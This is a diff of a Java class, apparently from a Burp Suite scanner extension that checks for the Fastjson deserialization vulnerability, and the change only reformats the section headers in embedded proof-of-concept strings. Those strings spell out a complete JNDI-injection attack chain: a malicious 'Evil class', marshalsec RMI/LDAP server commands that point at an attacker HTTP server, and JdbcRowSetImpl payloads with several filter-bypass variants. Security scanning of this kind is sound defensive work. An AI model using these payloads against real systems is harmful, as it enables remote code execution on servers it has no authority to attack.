@@ -11,8 +11,10 @@ import java.io.PrintWriter;
 public class FastJson {
 
     public static void JdbcRowSetImpl_0() {
-        String poc = "Condition\n1.2.24 + JDK1.8.0_102\n\n" +
-                "Evil class\npublic class Calc{\n" +
+        String poc = "##Condition##\n" +
+                "1.2.24 + JDK1.8.0_102\n\n" +
+                "##Evil class##\n" +
+                "public class Calc{\n" +
                 "    public Calc(){\n" +
                 "        try{\n" +
                 "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
@@ -28,11 +30,14 @@ public class FastJson {
                 "        Calc c = new Calc();\n" +
                 "    }\n" +
                 "}\n\n" +
-                "Step1\nstart http service -> python -m http.server 8808\n\n" +
-                "Step2\nmarshalsec start rmi/ldap service, \n" +
+                "##Step1##\n" +
+                "start http service -> python -m http.server 8808\n\n" +
+                "##Step2##\n" +
+                "marshalsec start rmi/ldap service, \n" +
                 "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
                 "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
-                "Step3\npoc:\n" +
+                "##Step3##\n" +
+                "#poc:\n" +
                 "{\"handsome\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
         // 1.2.24 + JDK1.8.0_102
         IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
@@ -68,8 +73,10 @@ public class FastJson {
     }
 
     public static void JdbcRowSetImpl_1() {
-        String poc = "Condition\n1.2.24 + JDK1.8.0_102\n\n" +
-                "Evil class\npublic class Calc{\n" +
+        String poc = "##Condition##\n" +
+                "1.2.24 + JDK1.8.0_102\n\n" +
+                "##Evil class##\n" +
+                "public class Calc{\n" +
                 "    public Calc(){\n" +
                 "        try{\n" +
                 "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
@@ -85,11 +92,14 @@ public class FastJson {
                 "        Calc c = new Calc();\n" +
                 "    }\n" +
                 "}\n\n" +
-                "Step1\nstart http service -> python -m http.server 8808\n\n" +
-                "Step2\nmarshalsec start rmi/ldap service, \n" +
+                "##Step1##\n" +
+                "start http service -> python -m http.server 8808\n\n" +
+                "##Step2##\n" +
+                "marshalsec start rmi/ldap service, \n" +
                 "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
                 "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
-                "Step3\npoc:\n" +
+                "##Step3##\n" +
+                "#poc:\n" +
                 "{\"handsome\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
         // 1.2.24 + JDK1.8.0_102
         IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
@@ -125,8 +135,10 @@ public class FastJson {
     }
 
     public static void JdbcRowSetImpl_2() {
-        String poc = "Condition\n1.2.24 + JDK1.8.0_102\n\n" +
-                "Evil class\npublic class Calc{\n" +
+        String poc = "##Condition##\n" +
+                "1.2.24 + JDK1.8.0_102\n\n" +
+                "##Evil class##\n" +
+                "public class Calc{\n" +
                 "    public Calc(){\n" +
                 "        try{\n" +
                 "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
@@ -142,11 +154,14 @@ public class FastJson {
                 "        Calc c = new Calc();\n" +
                 "    }\n" +
                 "}\n\n" +
-                "Step1\nstart http service -> python -m http.server 8808\n\n" +
-                "Step2\nmarshalsec start rmi/ldap service, \n" +
+                "##Step1##\n" +
+                "start http service -> python -m http.server 8808\n\n" +
+                "##Step2##\n" +
+                "marshalsec start rmi/ldap service, \n" +
                 "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
                 "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
-                "Step3\npoc:\n" +
+                "##Step3##\n" +
+                "#poc:\n" +
                 "{\"handsome\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
         // 1.2.24 + JDK1.8.0_102
         IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
@@ -182,8 +197,10 @@ public class FastJson {
     }
 
     public static void JdbcRowSetImpl_3() {
-        String poc = "Condition\n1.2.24 + JDK1.8.0_102\n\n" +
-                "Evil class\npublic class Calc{\n" +
+        String poc = "##Condition##\n" +
+                "1.2.24 + JDK1.8.0_102\n\n" +
+                "##Evil class##\n" +
+                "public class Calc{\n" +
                 "    public Calc(){\n" +
                 "        try{\n" +
                 "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
@@ -199,11 +216,14 @@ public class FastJson {
                 "        Calc c = new Calc();\n" +
                 "    }\n" +
                 "}\n\n" +
-                "Step1\nstart http service -> python -m http.server 8808\n\n" +
-                "Step2\nmarshalsec start rmi/ldap service, \n" +
+                "##Step1##\n" +
+                "start http service -> python -m http.server 8808\n\n" +
+                "##Step2##\n" +
+                "marshalsec start rmi/ldap service, \n" +
                 "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
                 "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
-                "Step3\npoc:\n" +
+                "##Step3##\n" +
+                "#poc:\n" +
                 "{\"handsome\":{\"@type\":\"LL\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
         // 1.2.24 + JDK1.8.0_102
         IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
@@ -239,8 +259,10 @@ public class FastJson {
     }
 
     public static void JdbcRowSetImpl_4() {
-        String poc = "Condition\n1.2.24 + JDK1.8.0_102\n\n" +
-                "Evil class\npublic class Calc{\n" +
+        String poc = "##Condition##\n" +
+                "1.2.24 + JDK1.8.0_102\n\n" +
+                "##Evil class##\n" +
+                "public class Calc{\n" +
                 "    public Calc(){\n" +
                 "        try{\n" +
                 "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
@@ -256,11 +278,14 @@ public class FastJson {
                 "        Calc c = new Calc();\n" +
                 "    }\n" +
                 "}\n\n" +
-                "Step1\nstart http service -> python -m http.server 8808\n\n" +
-                "Step2\nmarshalsec start rmi/ldap service, \n" +
+                "##Step1##\n" +
+                "start http service -> python -m http.server 8808\n\n" +
+                "##Step2##\n" +
+                "marshalsec start rmi/ldap service, \n" +
                 "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
                 "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
-                "Step3\npoc:\n" +
+                "##Step3##\n" +
+                "#poc:\n" +
                 "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}}";
         // 1.2.24 + JDK1.8.0_102
         IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
